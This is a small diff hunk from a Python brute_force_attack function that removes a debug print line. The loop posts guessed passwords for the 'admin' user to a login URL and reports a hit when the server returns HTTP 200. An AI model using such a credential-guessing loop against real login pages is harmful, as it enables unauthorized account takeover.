@@ -12,7 +12,6 @@ def brute_force_attack(url, pwd):
                 "username": "admin",
                 "password": password
             }
-            print(password)
             response = requests.post(url, data=data)
             if response.status_code == 200:
                 print("Username: admin")
